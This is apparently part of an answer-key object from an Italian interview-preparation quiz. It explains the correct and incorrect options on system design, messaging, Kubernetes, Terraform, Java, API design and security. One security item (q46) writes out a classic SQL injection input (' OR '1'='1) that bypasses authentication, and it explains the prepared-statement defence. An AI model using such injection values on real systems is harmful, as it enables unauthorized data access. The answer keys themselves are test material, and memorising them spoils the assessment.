            },
            q13: {
                correct: 'a',
                correctText: '✅ Corretto! Write-Behind (o Write-Back) scrive prima in cache e poi asincronamente (in batch) al database. Questo minimizza la latenza di scrittura perché l\'applicazione non deve aspettare la persistenza su DB. Il trade-off è che se la cache crasha prima del flush, i dati non ancora persistiti vanno persi. È ideale per scenari come analytics, logging, o contatori dove la perdita occasionale è accettabile.',
                incorrectText: {
                    b: '❌ Sbagliato. Write-Through scrive SINCRONAMENTE sia in cache che in DB. La latenza di scrittura è ALTA (somma di entrambe le scritture), non bassa. È il pattern giusto quando la consistency è prioritaria.',
                    c: '❌ Sbagliato. Cache-Aside (Lazy Loading) riguarda principalmente le LETTURE. Per le scritture, tipicamente si scrive direttamente al DB e si invalida/aggiorna la cache. Non ottimizza la latenza di scrittura.',
                    d: '❌ Sbagliato. Read-Through è un pattern di LETTURA: la cache carica automaticamente dal DB quando c\'è un miss. Non riguarda le scritture.'
                }
            },
            q14: {
                correct: 'd',
                correctText: '✅ Corretto! Con hash modulo N, se aggiungi o rimuovi un server (N cambia), TUTTE le chiavi vengono rimappate (k mod N diverso da k mod N±1). Con Consistent Hashing, solo le chiavi che "appartengono" al nodo aggiunto/rimosso vengono spostate (circa 1/N del totale). Questo è cruciale per cache distribuite dove rimappare tutto significherebbe cache miss massivi.',
                incorrectText: {
                    a: '❌ Sbagliato. Il Consistent Hashing è leggermente PIÙ costoso da calcolare (richiede trovare il nodo successivo sul ring). Il vantaggio non è la velocità di calcolo.',
                    b: '❌ Sbagliato. Il Consistent Hashing base NON garantisce distribuzione uniforme - alcuni nodi potrebbero avere più chiavi di altri. Si usano "virtual nodes" per migliorare la distribuzione, ma non è perfetta.',
                    c: '❌ Sbagliato. Entrambi gli approcci usano funzioni hash standard e supportano gli stessi tipi di chiavi. La differenza è come viene usato il risultato dell\'hash, non l\'input.'
                }
            },
            q15: {
                correct: 'c',
                correctText: '✅ Corretto! Quando il dominio di business non è ancora ben definito, i boundaries dei microservizi sono difficili da tracciare correttamente. Sbagliare i boundaries porta a "distributed monolith" - tutti gli svantaggi di entrambi gli approcci. Un monolite permette di refactorare facilmente mentre si impara il dominio, e si può sempre estrarre microservizi dopo quando i boundaries sono chiari (Monolith First approach di Martin Fowler).',
                incorrectText: {
                    a: '❌ Sbagliato. Il numero di utenti non determina l\'architettura. Monoliti ben progettati possono scalare a milioni di utenti (vedi Stack Overflow). La questione è se hai bisogno di scaling DIVERSO per parti diverse del sistema.',
                    b: '❌ Sbagliato. Avere esperienza con Kubernetes può facilitare i microservizi, ma non è un motivo per sceglierli. La scelta architetturale deve essere guidata dai requisiti di business e team, non dalla tecnologia che conosci.',
                    d: '❌ Sbagliato. Requisiti di scaling molto diversi tra componenti sono effettivamente un buon motivo per considerare i microservizi (puoi scalare indipendentemente). Questo è un fattore PRO microservizi, non pro monolite.'
                }
            },
            // Modulo 4 - Database & Messaging
            q16: {
                correct: 'b',
                correctText: '✅ Corretto! In Kafka, ogni partition può essere assegnata a UN SOLO consumer per consumer group. Con 6 partizioni e 8 consumer, solo 6 consumer riceveranno una partition ciascuno. I 2 consumer extra resteranno idle in standby, pronti a subentrare se uno degli altri fallisce (failover automatico).',
                incorrectText: {
                    a: '❌ Sbagliato. Kafka NON crea partizioni automaticamente in base ai consumer. Il numero di partizioni è definito alla creazione del topic (o modificato manualmente). È il contrario: devi dimensionare le partizioni in base al parallelismo desiderato.',
                    c: '❌ Sbagliato. Il round-robin avviene a livello di PARTIZIONE, non di consumer. Un messaggio va sempre alla stessa partition (basato su key o round-robin del producer), e quella partition è assegnata a un solo consumer del gruppo.',
                    d: '❌ Sbagliato. Kafka non rifiuta i consumer in eccesso. Li tiene nel gruppo come "idle" pronti per il failover. Questo è utile per high availability.'
                }
            },
            q17: {
                correct: 'd',
                correctText: '✅ Corretto! Fanout Exchange è progettato esattamente per questo use case: ignora completamente il routing key e inoltra ogni messaggio a TUTTE le queue collegate. È il pattern publish-subscribe puro. Ogni subscriber (email, SMS, push) ha la propria queue collegata al fanout, e tutti ricevono ogni messaggio.',
                incorrectText: {
                    a: '❌ Funzionerebbe, ma è over-engineered. Direct Exchange con lo stesso routing key richiede di mantenere la stessa key su tutti i binding. Fanout è più semanticamente corretto e più semplice.',
                    b: '❌ Funzionerebbe con pattern #, ma Topic Exchange è progettato per routing selettivo basato su pattern. Usarlo per broadcast è come usare una regex quando basta un semplice match.',
                    c: '❌ Headers Exchange è il più complesso, usato per routing basato su attributi multipli. Overkill per un semplice broadcast.'
                }
            },
            q18: {
                correct: 'c',
                correctText: '✅ Corretto! Kafka soddisfa tutti e 3 i requisiti: (1) I messaggi sono persistiti e rileggibi da qualsiasi offset (replay per debug). (2) Consumer groups diversi processano indipendentemente gli stessi messaggi. (3) Messaggi con la stessa key vanno sempre alla stessa partition, dove l\'ordine è garantito. RabbitMQ non supporta il replay nativamente.',
                incorrectText: {
                    a: '❌ Sbagliato. RabbitMQ rimuove i messaggi dopo l\'ACK, anche con TTL lungo. Non puoi rileggere messaggi già consumati. Il TTL ritarda solo la scadenza di messaggi NON consumati.',
                    b: '❌ Sbagliato. Multiple queue con Topic Exchange permettono a più consumer di ricevere gli stessi messaggi, ma (1) niente replay dopo consumo, (2) nessuna garanzia di ordine attraverso multiple queue.',
                    d: '❌ Sbagliato. Redis Pub/Sub è fire-and-forget: se il subscriber non è connesso, perde il messaggio. Non c\'è persistenza né replay. Redis Streams è diverso e più simile a Kafka, ma non è Pub/Sub.'
                }
            },
            q19: {
                correct: 'a',
                correctText: '✅ Corretto! Un Document DB come MongoDB è ideale per prodotti con attributi variabili. Ogni documento può avere campi diversi (laptop.cpu, tshirt.size) senza modifiche allo schema. Il pattern EAV in SQL è un anti-pattern noto per complessità delle query e pessime performance. Graph DB è per relazioni, Key-Value non supporta query sugli attributi.',
                incorrectText: {
                    b: '❌ Sbagliato. EAV (Entity-Attribute-Value) è considerato un anti-pattern SQL. Query come "trova laptop con RAM > 16GB" diventano JOIN complessi e lentissimi. È difficile da indicizzare e le query sono illeggibili.',
                    c: '❌ Sbagliato. Graph DB eccelle per relazioni (social network, raccomandazioni), non per dati con attributi variabili. Per "prodotti simili" potrebbe essere utile, ma non per il catalogo base.',
                    d: '❌ Sbagliato. Key-Value store (Redis) è ottimo per cache, ma non puoi fare query come "tutti i laptop rossi con prezzo < 1000€". Supporta solo lookup per key esatta.'
                }
            },
            q20: {
                correct: 'b',
                correctText: '✅ Corretto! acks controlla quante repliche devono confermare la scrittura prima che il producer consideri il messaggio "committed". acks=1: solo il leader conferma (veloce, ma rischio perdita se leader crasha prima della replica). acks=all: tutte le repliche in-sync devono confermare (più lento, ma massima durabilità). acks=0: fire-and-forget, nessuna conferma.',
                incorrectText: {
                    a: '❌ Sbagliato. acks non riguarda i consumer, ma la REPLICAZIONE tra broker. I consumer non sono coinvolti nel processo di ack del producer.',
                    c: '❌ Sbagliato. La compressione è configurata separatamente (compression.type). acks riguarda solo la conferma di scrittura.',
                    d: '❌ Sbagliato. Le transazioni Kafka si abilitano con transactional.id e enable.idempotence. acks=all è necessario per exactly-once, ma da solo non abilita le transazioni.'
                }
            },
            // Modulo 5: Cloud & DevOps
            q21: {
                correct: 'c',
                correctText: '✅ Corretto! Questo è il problema classico del Docker layer caching. Quando COPY . . è prima di npm install, OGNI modifica a qualsiasi file invalida il layer COPY. Tutti i layer successivi (npm install, npm build) vengono invalidati e rieseguiti. La soluzione è copiare prima package.json, poi npm install, e infine COPY . . per il resto del codice.',
                incorrectText: {
                    a: '❌ Sbagliato. Docker non può sapere che npm build dipende solo dai file TypeScript. Vede solo che il layer COPY è cambiato, quindi invalida TUTTI i layer successivi, incluso npm install.',
                    b: '❌ Sbagliato. Hai modificato un file, quindi il layer COPY . . è invalidato. Docker DEVE rieseguire quel layer e tutti quelli successivi.',
                    d: '❌ Sbagliato. I comandi RUN NON sono "sempre cached". Sono cached solo se TUTTI i layer precedenti sono ancora validi. Se COPY cambia, RUN viene rieseguito.'
                }
            },
            q22: {
                correct: 'b',
                correctText: '✅ Corretto! La readinessProbe controlla se il Pod può ricevere traffico, NON se deve essere riavviato. Se la readinessProbe fallisce, Kubernetes rimuove il Pod dagli endpoint del Service (quindi non riceve più traffico), ma il Pod continua a girare. Solo la livenessProbe può causare un restart. Questo è utile per Pod temporaneamente sovraccarichi che devono "riprendersi" senza essere riavviati.',
                incorrectText: {
                    a: '❌ Sbagliato. Il restart è controllato SOLO dalla livenessProbe. La readinessProbe controlla solo il traffico in ingresso, non il ciclo di vita del container.',
                    c: '❌ Sbagliato. Nessun Pod viene terminato se la livenessProbe passa. La readinessProbe non può causare terminazione o ricreazione.',
                    d: '❌ Sbagliato. La readinessProbe ha un effetto concreto: rimuove il Pod dagli endpoint del Service. Questo significa che il load balancer smette di inviare traffico a quel Pod.'
                }
            },
            q23: {
                correct: 'd',
                correctText: '✅ Corretto! L\'HPA calcola la percentuale basandosi sulle REQUESTS, non sui limits. Se requests.cpu è 200m e la target utilization è 70%, lo scaling scatta quando il Pod usa 140m (200m × 0.70). I limits definiscono il massimo che il container può usare, ma l\'HPA usa i requests come baseline per il calcolo della percentuale di utilizzo.',
                incorrectText: {
                    a: '❌ Sbagliato. L\'HPA usa i REQUESTS come base per il calcolo, non i limits. I limits sono solo un cap massimo, non influenzano il target dell\'HPA.',
                    b: '❌ Sbagliato. L\'HPA scala basandosi sull\'utilizzo dei singoli Pod rispetto ai loro requests, non sull\'utilizzo totale del nodo.',
                    c: '❌ Sbagliato. È assolutamente determinabile! L\'HPA usa una formula precisa: target = requests × targetPercentage. Con 200m requests e 70% target, lo scaling scatta a 140m.'
                }
            },
            q24: {
                correct: 'a',
                correctText: '✅ Corretto! Un aumento del tasso di errore di 50 volte (da 0.1% a 5%) è un segnale inequivocabile di un problema serio. In un canary deployment, il principio fondamentale è "fail fast": se le metriche indicano un problema, fai rollback immediatamente. Il canary esiste proprio per catturare questi problemi con impatto limitato (solo 10% del traffico). Continuare o aumentare il traffico esporrebbe più utenti al problema.',
                incorrectText: {
                    b: '❌ Sbagliato. Il 5% di errori in assoluto potrebbe sembrare basso, ma il confronto con la baseline (0.1%) mostra un peggioramento di 50x. Il canary deployment richiede confronto con la versione stable, non soglie assolute.',
                    c: '❌ Sbagliato. Aumentare il traffico significa esporre più utenti a una versione problematica. Il canary ha già raccolto abbastanza dati: 50x più errori è statisticamente significativo.',
                    d: '❌ Sbagliato. Ignorare un incremento di 50x nel tasso di errore è pericoloso. Gli errori potrebbero peggiorare sotto carico maggiore o accumularsi nel tempo.'
                }
            },
            q25: {
                correct: 'c',
                correctText: '✅ Corretto! Questo è esattamente il vantaggio principale del Blue-Green deployment: rollback istantaneo. L\'ambiente Blue è ancora attivo e pronto (non è stato terminato dopo lo switch). Basta modificare il Service selector o la configurazione del load balancer per reindirizzare immediatamente tutto il traffico a Blue. Nessun deployment, nessuna attesa, rollback in secondi.',
                incorrectText: {
                    a: '❌ Sbagliato. Fix forward richiede tempo (diagnosi, fix, test, build, deploy). Con un bug critico in produzione, vuoi minimizzare il tempo di esposizione. Il rollback istantaneo è sempre preferibile per bug critici.',
                    b: '❌ Sbagliato. Rolling update è lento e non sfrutti il vantaggio del Blue-Green. Hai già l\'ambiente Blue pronto, perché fare un rolling update quando puoi switchare istantaneamente?',
                    d: '❌ Sbagliato. Scalare Green a 0 è inutilmente lento e non garantisce uno switch pulito. Il load balancer o Service già punta a Blue, basta cambiare quella configurazione.'
                }
            },
            // Modulo 6: Advanced Topics 2026
            q26: {
                correct: 'c',
                correctText: '✅ Corretto! Il context propagation è fondamentale: quando A decide di tracciare (campionare) un trace, quella decisione viene propagata a B e C via headers (es. W3C traceparent). Ogni servizio downstream onora la decisione del parent. Questo garantisce che un trace sia completo o completamente assente, mai parziale. Se ogni servizio decidesse indipendentemente, avresti traces "rotti" impossibili da correlare.',
                incorrectText: {
                    a: '❌ Sbagliato. Se B e C facessero sampling indipendente, un trace campionato al 10% in A avrebbe solo 1% di probabilità di essere completo (0.1 × 0.1 × 0.1). Il context propagation esiste proprio per evitare questo problema.',
                    b: '❌ Sbagliato. Il sampling non si applica "solo all\'entry point" in modo magico. È il context propagation esplicito (via headers) che porta la decisione di sampling ai servizi downstream.',
                    d: '❌ Sbagliato. I servizi non consultano il collector per decidere se tracciare. La decisione è presa localmente e propagata via headers HTTP/gRPC. Il collector riceve solo i dati già generati.'
                }
            },
            q27: {
                correct: 'b',
                correctText: '✅ Corretto! "Must be replaced" (o "forces replacement") significa che la modifica richiesta non può essere applicata in-place. Terraform distruggerà la risorsa esistente e ne creerà una nuova. Per un\'istanza EC2, questo significa downtime: l\'istanza viene terminata, poi ne viene creata una nuova con nuovo IP, nuovo instance ID, etc. È critico notare questi "replace" nel plan e usare create_before_destroy o strategie blue-green per evitare downtime.',
                incorrectText: {
                    a: '❌ Sbagliato. "In-place update" è indicato da "will be updated" nel plan, non "must be replaced". Replace significa distruzione + ricreazione.',
                    c: '❌ Sbagliato. Di default Terraform fa destroy-then-create, non crea backup. Solo con lifecycle { create_before_destroy = true } viene creata prima la nuova risorsa.',
                    d: '❌ Sbagliato. Non è solo un warning: se fai apply, la risorsa VERRÀ distrutta e ricreata. Il plan ti sta avvisando di cosa succederà, non chiedendo conferma.'
                }
            },
            q28: {
                correct: 'd',
                correctText: '✅ Corretto! Una similarity threshold di 0.8 (80%) è molto alta per cosine similarity su embeddings. Query semanticamente equivalenti ma con wording diverso (es. "come faccio il rimborso" vs "procedura restituzione") potrebbero avere similarity 0.7-0.75 e essere scartate. Abbassare a 0.6-0.7 cattura più risultati rilevanti. Il trade-off è più noise, che può essere filtrato con re-ranking o aumentando top-K.',
                incorrectText: {
                    a: '❌ Sbagliato. La context window riguarda l\'LLM, non il retrieval. Se i documenti fossero troppo lunghi, il problema sarebbe nella generazione (risposta troncata), non nel retrieval (documenti non trovati).',
                    b: '❌ Sbagliato. Se il vector DB non avesse memoria sufficiente, avresti errori di sistema o crash, non semplicemente risultati mancanti. Gli embeddings sono relativamente piccoli (pochi KB ciascuno).',
                    c: '❌ Sbagliato. Il problema descritto è che i documenti non vengono TROVATI nel retrieval, non che l\'LLM li ignora. L\'hallucination è un problema diverso (rispondere senza contesto).'
                }
            },
            q29: {
                correct: 'a',
                correctText: '✅ Corretto! Questa è una "gotcha" classica di Prometheus. In realtà, rate() E increase() gestiscono automaticamente i counter reset (restart dell\'applicazione). Se vedi valori negativi, probabilmente stai usando una raw subtraction invece di rate/increase, oppure c\'è un problema di clock skew. La funzione rate() calcola (valore_finale - valore_iniziale) / tempo, ma detecta i reset e compensa. Il problema potrebbe essere reale se usi resets() che conta i reset senza compensare.',
                incorrectText: {
                    b: '❌ Sbagliato. I counter sono corretti per contare eventi cumulativi. I Gauge sono per valori che possono salire e scendere (temperatura, connessioni attive). Un http_requests_total DEVE essere un counter.',
                    c: '❌ Sbagliato. I counter resettano legittimamente quando l\'applicazione riavvia. È comportamento normale e atteso. Prometheus gestisce questo caso con rate()/increase().',
                    d: '❌ Sbagliato. Non devi filtrare manualmente i punti. Le funzioni rate() e increase() di Prometheus gestiscono automaticamente i reset. Se vedi negativi, il problema è altrove (query sbagliata, scrape interval, clock skew).'
                }
            },
            q30: {
                correct: 'c',
                correctText: '✅ Corretto! Senza state locking, entrambi gli apply leggono lo stesso state iniziale, fanno le loro modifiche al cloud, poi scrivono lo state finale. Il secondo a scrivere sovrascrive lo state del primo, "dimenticando" le risorse create dal primo. Risultato: risorse "orphaned" nel cloud (esistono ma Terraform non le conosce) o state corrotto. Per questo si usa DynamoDB (AWS) o altri sistemi per state locking.',
                incorrectText: {
                    a: '❌ Sbagliato. Terraform non serializza automaticamente nulla. È responsabilità dell\'utente/team configurare state locking con DynamoDB, Consul, o Terraform Cloud.',
                    b: '❌ Sbagliato. Senza locking, non c\'è nessun errore di conflitto. Entrambi gli apply procedono "felicemente" e il problema emerge dopo, quando lo state è già corrotto.',
                    d: '❌ Sbagliato. Le risorse non vengono duplicate automaticamente. Il problema è nello STATE, non nelle risorse cloud. Una delle modifiche viene "persa" dallo state tracking.'
                }
            },
            // Modulo 7: Coding Challenges
            q31: {
                correct: 'b',
                correctText: '✅ Corretto! Con una Singly Linked List, per rimuovere un nodo devi conoscere il nodo precedente, il che richiede O(n) traversal. Con una Doubly Linked List, ogni nodo ha un puntatore al precedente (prev), quindi la rimozione è O(1): basta fare node.prev.next = node.next e node.next.prev = node.prev. Questo è cruciale per mantenere O(1) sia per get() che per put().',
                incorrectText: {
                    a: '❌ Sbagliato. L\'iterazione bidirezionale non è necessaria per LRU Cache. Ci serve solo aggiungere in testa e rimuovere dalla coda (o rimuovere un nodo arbitrario quando viene accesso).',
                    c: '❌ Sbagliato. Una Doubly Linked List usa PIÙ spazio (un puntatore extra per nodo), non meno. Il trade-off è spazio per tempo.',
                    d: '❌ Sbagliato. Java supporta implementazioni di liste singly linked. LinkedList di Java è in realtà una doubly linked list, ma nulla impedisce di implementarne una singly.'
                }
            },
            q32: {
                correct: 'c',
                correctText: '✅ Corretto! LinkedHashMap in Java con accessOrder=true mantiene automaticamente l\'ordine di accesso e supporta removeEldestEntry() per l\'eviction automatica. Internamente usa una struttura simile alla nostra (HashMap + doubly linked list), quindi tutte le operazioni sono O(1). Questa è effettivamente la soluzione "production-ready" in Java.',
                incorrectText: {
                    a: '❌ Sbagliato. LinkedHashMap ha O(1) per get e put, non O(n). Internamente combina HashMap (O(1) lookup) con linked list (O(1) reordering).',
                    b: '❌ Sbagliato. L\'eviction in LinkedHashMap è O(1): il nodo più vecchio è sempre in testa alla lista interna, basta rimuoverlo.',
                    d: '❌ Sbagliato. LinkedHashMap non usa strutture logaritmiche come alberi. È O(1) amortizzato come una normale HashMap.'
                }
            },
            q33: {
                correct: 'a',
                correctText: '✅ Corretto! Con solo un tipo di parentesi, non serve uno stack completo. Basta un contatore: incrementa per \'(\', decrementa per \')\'. Se il contatore diventa negativo, la stringa è invalida (più chiuse che aperte). Alla fine, il contatore deve essere 0. Questo è O(1) space. Con parentesi multiple (()[]{}) serve lo stack perché devi matchare il TIPO corretto.',
                incorrectText: {
                    b: '❌ Sbagliato. Lo stack è necessario solo per parentesi multiple dove devi verificare che la chiusura corrisponda all\'apertura giusta. Con un solo tipo, il contatore basta.',
                    c: '❌ Sbagliato. Non esiste una soluzione O(log n) space per questo problema. È O(1) con contatore o O(n) con stack.',
                    d: '❌ Sbagliato. Non serve confrontare ogni coppia. Basta un singolo passaggio O(n) time con O(1) space (contatore).'
                }
            },
            q34: {
                correct: 'd',
                correctText: '✅ Corretto! Se l\'input è già ordinato per start time, il sorting O(n log n) non è necessario. Il merge richiede solo un singolo passaggio lineare O(n): scorri gli intervalli, e per ognuno decidi se estendere l\'ultimo o aggiungerne uno nuovo. Questa è un\'ottimizzazione importante da menzionare al colloquio: chiedi sempre se l\'input ha proprietà speciali!',
                incorrectText: {
                    a: '❌ Sbagliato. Se sai che l\'input è ordinato, non devi ri-verificarlo. Puoi procedere direttamente con il merge O(n). Verificare se è ordinato sarebbe comunque O(n), non O(n log n).',
                    b: '❌ Sbagliato. Non serve confrontare ogni intervallo con tutti gli altri. Con input ordinato, gli intervalli sovrapponibili sono sempre adiacenti.',
                    c: '❌ Sbagliato. Il problema non diventa O(1). Devi comunque processare tutti gli n intervalli per produrre il risultato. È O(n), non O(1).'
                }
            },
            q35: {
                correct: 'b',
                correctText: '✅ Corretto! Il problema principale è l\'atomicità: get() e put() devono aggiornare sia la HashMap che la lista in modo atomico. Se un thread fa get() mentre un altro fa put() con eviction, potresti avere inconsistenze (es. nodo nella HashMap ma non nella lista, o viceversa). ConcurrentHashMap da solo non basta perché non protegge le operazioni sulla lista. Serve sincronizzazione che copra entrambe le strutture.',
                incorrectText: {
                    a: '❌ Sbagliato. ConcurrentHashMap protegge solo la HashMap. Le operazioni sulla linked list e l\'atomicità tra HashMap e lista non sono garantite.',
                    c: '❌ Sbagliato. Tecnicamente puoi condividere la lista, ma devi sincronizzare gli accessi. Il problema è l\'atomicità delle operazioni composite, non la condivisione in sé.',
                    d: '❌ Sbagliato. Le strutture dati standard in Java (HashMap, LinkedList, etc.) NON sono thread-safe. Solo le classi in java.util.concurrent lo sono.'
                }
            },
            // Modulo 8: Paradigmi di Programmazione
            q36: {
                correct: 'c',
                correctText: '✅ Corretto! add(a, b) è pura: dato gli stessi a e b, ritorna sempre lo stesso risultato (a+b) e non ha side effects. Le altre: count() modifica stato esterno (counter++), random() non è deterministica (ritorna valori diversi), log() ha side effect (scrive su stdout).',
                incorrectText: {
                    a: '❌ Sbagliato. counter++ è un side effect: modifica stato esterno alla funzione. Inoltre, chiamate successive ritornano valori diversi anche senza argomenti.',
                    b: '❌ Sbagliato. Math.random() non è deterministica: ogni chiamata ritorna un valore diverso. Una funzione pura deve ritornare lo stesso output per lo stesso input.',
                    d: '❌ Sbagliato. System.out.println() è un side effect: modifica il "mondo esterno" (scrive su stdout). Inoltre ritorna void, non trasforma input in output.'
                }
            },
            q37: {
                correct: 'b',
                correctText: '✅ Corretto! Le operazioni I/O-bound (network, disk) NON beneficiano di parallel streams perché: 1) Il thread aspetta la risposta, non usa CPU. 2) Il ForkJoinPool comune è progettato per CPU-bound tasks. 3) Operazioni bloccanti possono "affamare" altri parallel streams. Per I/O parallelo, usa CompletableFuture con un executor dedicato o reactive streams.',
                incorrectText: {
                    a: '❌ Sbagliato. Operazioni CPU-intensive come isPrime sono il caso d\'uso IDEALE per parallel streams: dividono il lavoro di calcolo tra i core.',
                    c: '❌ Sbagliato. complexCalculation è CPU-bound, quindi beneficia del parallelismo. Ogni core può eseguire calcoli indipendenti.',
                    d: '❌ Sbagliato. reduce può essere parallelizzato se l\'operazione è associativa (come la somma). Java partiziona i dati, riduce in parallelo, poi combina i risultati.'
                }
            },
            q38: {
                correct: 'd',
                correctText: '✅ Corretto! orElse() valuta SEMPRE l\'argomento, anche se Optional ha un valore. Se Optional contiene "Alice", expensiveComputation() viene comunque eseguita (poi ignorata). Questo è un bug di performance silenzioso. Usa orElseGet(() -> expensiveComputation()) per lazy evaluation: il supplier viene chiamato solo se Optional è vuoto.',
                incorrectText: {
                    a: '❌ Sbagliato. orElse("default") è corretto: "default" è una costante, non c\'è calcolo sprecato.',
                    b: '❌ Sbagliato. map() è lazy e corretto: trasforma il valore solo se presente, altrimenti propaga Optional.empty().',
                    c: '❌ Sbagliato. orElseThrow() è corretto per casi dove l\'assenza è un errore. Lancia eccezione esplicitamente, non è un bug silenzioso.'
                }
            },
            q39: {
                correct: 'a',
                correctText: '✅ Corretto! La laziness permette: 1) Short-circuit: findFirst() si ferma al primo match senza processare tutto. 2) Loop fusion: filter().map() può essere fuso in un singolo passaggio invece di creare collezioni intermedie. 3) Nessun lavoro sprecato: se non c\'è operazione terminale, nulla viene eseguito. Questo è cruciale per performance su dataset grandi.',
                incorrectText: {
                    b: '❌ Sbagliato. La laziness non riguarda la thread-safety. Gli Stream possono avere race conditions se usati impropriamente (es. side effects in forEach parallelo).',
                    c: '❌ Sbagliato. La laziness è una scelta di design per performance, non per compatibilità. Era una feature nuova in Java 8.',
                    d: '❌ Sbagliato. Java può eseguire metodi void. La laziness è intenzionale per ottimizzazione, non una limitazione del linguaggio.'
                }
            },
            q40: {
                correct: 'c',
                correctText: '✅ Corretto! Se un oggetto è immutabile, non può cambiare stato dopo la creazione. Questo significa che: 1) Non servono lock/synchronized per leggere. 2) Non esistono race conditions (nessuno può modificare mentre un altro legge). 3) Puoi condividere liberamente tra thread. Questo semplifica enormemente la programmazione concorrente, eliminando intere categorie di bug.',
                incorrectText: {
                    a: '❌ Sbagliato. L\'immutabilità può aumentare l\'uso di memoria (ogni "modifica" crea un nuovo oggetto). La condivisione è safe ma non necessariamente riduce memoria.',
                    b: '❌ Sbagliato. Il GC non lavora "più efficientemente" con oggetti immutabili. Anzi, creare molti oggetti può aumentare la pressione sul GC.',
                    d: '❌ Sbagliato. L\'immutabilità non rende automaticamente il codice più veloce. Il vantaggio è la sicurezza thread-safe, non la raw performance.'
                }
            },
            // Modulo 9: API Design
            q41: {
                correct: 'b',
                correctText: '✅ Corretto! POST non è idempotente per design: ogni richiesta crea una nuova risorsa. Senza idempotency key, il server non ha modo di sapere che la seconda richiesta è un retry, quindi crea due ordini. Per questo si usa X-Idempotency-Key: il client genera un ID unico, e il server lo usa per riconoscere i retry e ritornare il risultato cached invece di processare di nuovo.',
                incorrectText: {
                    a: '❌ Sbagliato. Il server non può rilevare automaticamente i duplicati senza un meccanismo esplicito (idempotency key). Due richieste identiche sono indistinguibili.',
                    c: '❌ Sbagliato. 409 Conflict si usa per violazioni di constraint (es. email già esistente), non per retry detection. Senza idempotency key, non c\'è conflitto - sono due creazioni valide.',
                    d: '❌ Sbagliato. HTTP non garantisce at-most-once. Il protocollo è stateless - ogni richiesta è indipendente. La semantica di delivery dipende dall\'applicazione.'
                }
            },
            q42: {
                correct: 'c',
                correctText: '✅ Corretto! Per feed social (timeline), cursor-based pagination è ideale perché: 1) I dati cambiano frequentemente (nuovi post) - offset causerebbe duplicati o post mancanti. 2) Non serve "vai a pagina 57" - lo scroll è sempre sequenziale. 3) Performance: il cursor (tipicamente timestamp + ID) usa indici efficientemente, mentre OFFSET 10000 deve scorrere 10000 righe.',
                incorrectText: {
                    a: '❌ Sbagliato. Offset-based ha problemi con dati in movimento: se un nuovo post viene aggiunto mentre scrolli, vedrai duplicati o salterai post.',
                    b: '❌ Sbagliato. Un feed social può avere milioni di post. Caricare tutto è impossibile per memoria e bandwidth. La pagination è obbligatoria.',
                    d: '❌ Sbagliato. Un feed deve essere ordinato cronologicamente (o per relevance). Random sampling renderebbe l\'UX caotica e inutilizzabile.'
                }
            },
            q43: {
                correct: 'a',
                correctText: '✅ Corretto! 403 Forbidden: l\'utente È autenticato (sappiamo chi è) ma NON È autorizzato ad accedere a quella specifica risorsa. 401 Unauthorized significa "non autenticato" (nome fuorviante nello standard HTTP). La distinzione è importante per il client: 401 → mostra login, 403 → mostra "accesso negato".',
                incorrectText: {
                    b: '❌ Sbagliato. 401 Unauthorized si usa quando l\'utente NON è autenticato (token mancante/invalido). Qui l\'utente è autenticato, ma non ha i permessi.',
                    c: '❌ Sbagliato. 404 indica che la risorsa non esiste. Usarlo per nascondere l\'esistenza può avere senso per sicurezza (security through obscurity), ma non è semanticamente corretto.',
                    d: '❌ Sbagliato. 400 Bad Request indica problemi con la richiesta stessa (JSON malformato, validation error). L\'autorizzazione non è un problema di formato richiesta.'
                }
            },
            q44: {
                correct: 'd',
                correctText: '✅ Corretto! HTTP cache usa l\'URL come cache key. In REST, GET /users/123 e GET /users/456 sono URL diverse → cache separate. In GraphQL, TUTTE le query vanno a POST /graphql con query nel body. Stesso URL per query diverse = impossibile cachare a livello HTTP/CDN. Soluzioni: persisted queries (hash → query), GET con query param, o caching application-level.',
                incorrectText: {
                    a: '❌ Sbagliato. GraphQL usa JSON, non formato binario. Il formato non è il problema del caching.',
                    b: '❌ Sbagliato. Le response possono essere deterministiche. Il problema è che l\'HTTP cache non sa distinguere query diverse perché vanno tutte allo stesso endpoint.',
                    c: '❌ Sbagliato. GraphQL supporta tutti gli HTTP headers. Il problema è il metodo (POST) e l\'endpoint unico, non gli headers.'
                }
            },
            q45: {
                correct: 'b',
                correctText: '✅ Corretto! Per comunicazione interna ad alta frequenza, gRPC eccelle: 1) Protocol Buffers sono 3-10x più piccoli di JSON. 2) HTTP/2 multiplexing: una connessione, molte richieste parallele senza head-of-line blocking. 3) Code generation: client/server strongly typed, meno errori. 4) Streaming nativo per scenari real-time. REST è più semplice ma meno efficiente; GraphQL è per frontend flexibility, non performance backend.',
                incorrectText: {
                    a: '❌ Sbagliato. Per servizi interni, la facilità di debug con curl è meno importante della performance. gRPC ha tools (grpcurl, Evans) e observability ottima.',
                    c: '❌ Sbagliato. GraphQL risolve problemi di frontend (over/under-fetching). Tra microservizi, le interfacce sono definite chiaramente - la flessibilità GraphQL aggiunge overhead senza beneficio.',
                    d: '❌ Sbagliato. WebSocket è per comunicazione bidirezionale push-based (chat, notifiche). Per request-response ad alta frequenza, gRPC con HTTP/2 è più appropriato e strutturato.'
                }
            },
            // Modulo 10: Security
            q46: {
                correct: 'c',
                correctText: '✅ Corretto! La query diventa: SELECT * FROM users WHERE id = \'1\' OR \'1\'=\'1\'. Poiché \'1\'=\'1\' è sempre vero, la condizione WHERE è sempre vera per OGNI riga. Risultato: ritorna TUTTI gli utenti. Questo è un classico bypass di autenticazione. Con prepared statements, l\'input verrebbe trattato come stringa letterale, non come codice SQL.',
                incorrectText: {
                    a: '❌ Sbagliato. La query è sintatticamente valida. Gli apici sono bilanciati e l\'OR è SQL valido.',
                    b: '❌ Sbagliato. Il database non cerca un ID con quel valore letterale. Interpreta l\'input come codice SQL, aggiungendo una condizione OR sempre vera.',
                    d: '❌ Sbagliato. I database non hanno protezione automatica contro SQL injection. È responsabilità dell\'applicazione usare prepared statements.'
                }
            },
            q47: {
                correct: 'b',
                correctText: '✅ Corretto! JWT per design sono stateless - il server non tiene traccia dei token emessi. Per revocare un token specifico, devi implementare una blacklist (in Redis o DB) dei token revocati. Ad ogni richiesta, oltre a verificare la firma, controlli se il token è in blacklist. Trade-off: perdi parte della "statelessness", ma è l\'unico modo per revoca immediata.',
                incorrectText: {
                    a: '❌ Sbagliato. Cambiare la secret key invalida TUTTI i token, non solo quello rubato. Tutti gli utenti dovrebbero riautenticarsi.',
                    c: '❌ Sbagliato. Aspettare la scadenza può significare ore o giorni di accesso non autorizzato. Inaccettabile per security.',
                    d: '❌ Sbagliato. La firma garantisce che il token non sia stato MODIFICATO, non che non sia stato COPIATO. Se l\'attacker ha il token, può usarlo.'
                }
            },
